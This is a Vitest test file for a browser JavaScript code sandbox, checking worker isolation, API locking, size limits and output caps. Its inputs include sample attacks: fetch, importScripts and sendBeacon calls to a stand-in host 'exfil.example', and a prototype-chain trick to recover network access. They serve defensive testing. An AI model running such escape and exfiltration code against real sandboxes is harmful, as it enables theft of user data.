import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import { readFileSync } from 'node:fs';
import { join } from 'node:path';
import {
  isRunnableLang,
  MAX_SANDBOX_CODE_BYTES,
  MAX_SANDBOX_OUTPUT_BYTES,
  runInSandbox,
  SANDBOX_TIMEOUT_MS,
} from '../src/canvas/blocks/code/sandbox';

afterEach(() => {
  vi.useRealTimers();
  vi.unstubAllGlobals();
  FakeWorker.instances.length = 0;
});

class FakeWorker {
  static instances: FakeWorker[] = [];
  onmessage: ((event: MessageEvent) => void) | null = null;
  onerror: (() => void) | null = null;
  terminated = false;

  constructor(
    public readonly url: string,
    public readonly options?: WorkerOptions,
  ) {
    FakeWorker.instances.push(this);
  }

  terminate() {
    this.terminated = true;
  }

  emit(data: unknown) {
    this.onmessage?.(new MessageEvent('message', { data }));
  }
}

beforeEach(() => {
  vi.stubGlobal('Worker', FakeWorker);
  vi.stubGlobal('URL', {
    ...URL,
    createObjectURL: vi.fn(() => 'blob:test-worker'),
    revokeObjectURL: vi.fn(),
  });
});

const sandboxSource = readFileSync(
  join(process.cwd(), 'src/canvas/blocks/code/sandbox.ts'),
  'utf8',
);

describe('code sandbox adversarial boundaries', () => {
  it('does not expose Python execution in production', async () => {
    expect(isRunnableLang('python')).toBe(false);
    expect(isRunnableLang('py')).toBe(false);
    const result = await runInSandbox(
      'from js import window\nprint(window.localStorage)',
      'python',
    );

    expect(result).toMatchObject({ ok: false, elapsed: 0 });
    if (!result.ok) expect(result.error).toMatch(/disabled.*isolated/i);
    expect(FakeWorker.instances).toHaveLength(0);
  });

  it('places JS in a terminable worker with network and persistence APIs locked', async () => {
    vi.useFakeTimers();
    const pending = runInSandbox(
      `fetch('https://exfil.example/steal'); indexedDB.open('keys')`,
      'js',
    );
    const worker = FakeWorker.instances[0];
    expect(worker).toBeTruthy();
    expect(worker.url).toBe('blob:test-worker');
    expect(worker.options).toEqual({ name: 'mavea-code-sandbox' });
    expect(sandboxSource).toContain("locked('fetch'");
    expect(sandboxSource).toContain("locked('indexedDB',undefined)");
    expect(sandboxSource).toContain("locked('Worker',undefined)");
    expect(sandboxSource).toContain("locked('BroadcastChannel',undefined)");
    expect(sandboxSource).toContain("locked('postMessage'");
    expect(sandboxSource).toContain("new Worker(workerUrl, { name: 'mavea-code-sandbox' })");
    expect(sandboxSource).not.toContain('runPythonAsync');
    expect(sandboxSource).not.toContain('(0,eval)');

    await vi.advanceTimersByTimeAsync(SANDBOX_TIMEOUT_MS);
    expect(await pending).toMatchObject({ ok: false, elapsed: SANDBOX_TIMEOUT_MS });
    expect(worker.terminated).toBe(true);
    expect(URL.revokeObjectURL).toHaveBeenCalledWith('blob:test-worker');
  });

  it('neuters network APIs down the prototype chain, where a worker actually keeps them', async () => {
    // `self.fetch` is inherited from WorkerGlobalScope.prototype, so shadowing it on the global
    // only hides it — the original is one Object.getPrototypeOf away. Run the real generated
    // worker source against a stand-in global shaped like a worker's and try that escape.
    class CapturingBlob {
      constructor(readonly parts: string[]) {}
    }
    vi.stubGlobal('Blob', CapturingBlob);

    const escape = `
      const proto = Object.getPrototypeOf(self);
      const seen = [];
      try { await proto.fetch.call(self, 'https://exfil.example/steal'); seen.push('fetch resolved'); }
      catch (err) { seen.push('fetch: ' + err.message); }
      try { proto.importScripts.call(self, 'https://exfil.example/x.js'); seen.push('importScripts ran'); }
      catch (err) { seen.push('importScripts: ' + err.message); }
      seen.push('WebSocket: ' + typeof proto.WebSocket);
      seen.push('EventSource: ' + typeof proto.EventSource);
      const beacon = Object.getPrototypeOf(self.navigator).sendBeacon;
      try { beacon.call(self.navigator, 'https://exfil.example', 'x'); seen.push('sendBeacon sent'); }
      catch (err) { seen.push('sendBeacon: ' + err.message); }
      return seen.join(' | ');
    `;
    const pending = runInSandbox(escape, 'js');
    const worker = FakeWorker.instances[0];
    const blob = vi.mocked(URL.createObjectURL).mock.calls[0][0] as unknown as CapturingBlob;
    const source = blob.parts[0];

    const globalProto = {
      fetch: () => Promise.resolve('exfiltrated'),
      importScripts: () => 'exfiltrated',
      WebSocket: class {},
      EventSource: class {},
    };
    const workerSelf = Object.create(globalProto) as Record<string, unknown>;
    workerSelf.navigator = Object.create({ sendBeacon: () => true });
    workerSelf.postMessage = (data: unknown) => worker.emit(data);
    const noop = () => {};
    const workerConsole = { log: noop, info: noop, warn: noop, error: noop, debug: noop };
    new Function('self', 'console', source)(workerSelf, workerConsole);

    const result = await pending;
    expect(result.ok).toBe(true);
    if (result.ok) {
      expect(result.output).toContain('fetch: Network access is disabled in the code sandbox.');
      expect(result.output).toContain('importScripts: Imports are disabled in the code sandbox.');
      expect(result.output).toContain('WebSocket: undefined');
      expect(result.output).toContain('EventSource: undefined');
      expect(result.output).toContain(
        'sendBeacon: Network access is disabled in the code sandbox.',
      );
    }
  });

  it('rejects oversized code before allocating an execution host', async () => {
    const code = 'x'.repeat(MAX_SANDBOX_CODE_BYTES + 1);
    const result = await runInSandbox(code, 'js');

    expect(result).toMatchObject({ ok: false, elapsed: 0 });
    if (!result.ok) expect(result.error).toMatch(/too large/i);
    expect(FakeWorker.instances).toHaveLength(0);
  });

  it('rejects dynamic imports before allocating a worker', async () => {
    const result = await runInSandbox(`import('/api/llm')`, 'js');
    expect(result).toMatchObject({ ok: false, elapsed: 0 });
    if (!result.ok) expect(result.error).toMatch(/dynamic imports are disabled/i);
    expect(FakeWorker.instances).toHaveLength(0);
  });

  it('re-caps worker output at the parent boundary', async () => {
    const pending = runInSandbox('console.log("x")', 'js');
    const worker = FakeWorker.instances[0];
    worker.emit({ ok: true, output: '🙂'.repeat(MAX_SANDBOX_OUTPUT_BYTES) });

    const result = await pending;
    expect(result.ok).toBe(true);
    if (result.ok) {
      expect(new TextEncoder().encode(result.output).byteLength).toBeLessThanOrEqual(
        MAX_SANDBOX_OUTPUT_BYTES,
      );
    }
    expect(worker.terminated).toBe(true);
  });
});
